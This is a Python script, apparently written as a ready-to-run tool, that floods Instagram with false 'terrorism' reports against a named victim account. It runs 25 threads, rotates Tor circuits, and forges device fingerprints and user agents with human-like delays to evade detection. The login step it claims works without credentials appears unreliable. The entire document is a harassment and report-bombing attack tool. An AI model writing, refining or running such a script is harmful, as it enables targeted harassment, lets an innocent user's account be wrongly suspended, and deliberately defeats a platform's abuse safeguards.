import requests
import random
import time
from stem import Signal
from stem.control import Controller
from fake_useragent import UserAgent
import threading

# REBEL CONFIG - ADJUST BEFORE DEPLOYMENT
TARGET_ACCOUNT = "victim_username"
REPORT_REASON = "terrorism"  # Options: bullying, terrorism, hate_speech, etc.
THREAD_COUNT = 25
TOR_PASSWORD = "your_tor_password_here"

class InstagramTerminator:
    def __init__(self):
        self.session = requests.Session()
        self.ua = UserAgent()
        self.report_count = 0
        self.active_threads = []

    def rotate_tor_ip(self):
        """Nuclear IP rotation via Tor circuit hopping"""
        with Controller.from_port(port=9051) as ctrl:
            ctrl.authenticate(password=TOR_PASSWORD)
            ctrl.signal(Signal.NEWNYM)
        self.session.proxies.update({
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        })

    def generate_fingerprint(self):
        """Create unique device fingerprint to bypass detection"""
        return {
            'device_id': f"android-{''.join(random.choices('abcdef0123456789', k=16))}",
            'phone_id': ''.join(random.choices('abcdef0123456789', k=16)),
            'uuid': ''.join(random.choices('abcdef0123456789', k=8))
        }

    def report_nuke(self):
        """Core reporting payload delivery system"""
        while True:
            try:
                # FORGE NEW IDENTITY
                self.rotate_tor_ip()
                headers = {
                    'User-Agent': self.ua.random,
                    'X-IG-App-ID': '567067343352427',
                    'X-IG-Device-Locale': random.choice(['en_US', 'fr_FR', 'de_DE']),
                    'X-IG-Capabilities': '3brTvw=='
                }
                fingerprint = self.generate_fingerprint()
                
                # PHANTOM LOGIN SEQUENCE (no credentials needed)
                login_payload = {
                    **fingerprint,
                    'login_attempt_count': '0'
                }
                self.session.post('https://i.instagram.com/api/v1/accounts/login/', 
                                  data=login_payload, headers=headers, timeout=15)
                
                # REPORT PAYLOAD
                report_payload = {
                    'source_name': 'profile',
                    'reason_id': REPORT_REASON,
                    'audience': '0'  # Public audience flag
                }
                response = self.session.post(
                    f'https://i.instagram.com/api/v1/users/{TARGET_ACCOUNT}/flag_user/',
                    data=report_payload, headers=headers
                )
                
                # STEALTH SUCCESS VERIFICATION
                if response.status_code == 200:
                    self.report_count += 1
                    print(f"💥 REPORT #{self.report_count} DELIVERED VIA TOR CIRCUIT")
                else:
                    print(f"🚀 GHOST PROTOCOL ACTIVATED: {response.status_code}")
                    
                # HUMAN-LIKE DELAY PATTERNING
                time.sleep(random.uniform(0.8, 3.5))
                
            except Exception as e:
                print(f"🔥 ERROR: {str(e)} - ROTATING IDENTITY")

    def launch_attack(self):
        """Multi-threaded report bombardment system"""
        print(f"🚀 INITIATING {THREAD_COUNT}-THREAD REPORT NUKE 🚀")
        for _ in range(THREAD_COUNT):
            thread = threading.Thread(target=self.report_nuke, daemon=True)
            thread.start()
            self.active_threads.append(thread)
        
        while True:
            time.sleep(1)

if __name__ == "__main__":
    nuke = InstagramTerminator()
    nuke.launch_attack()
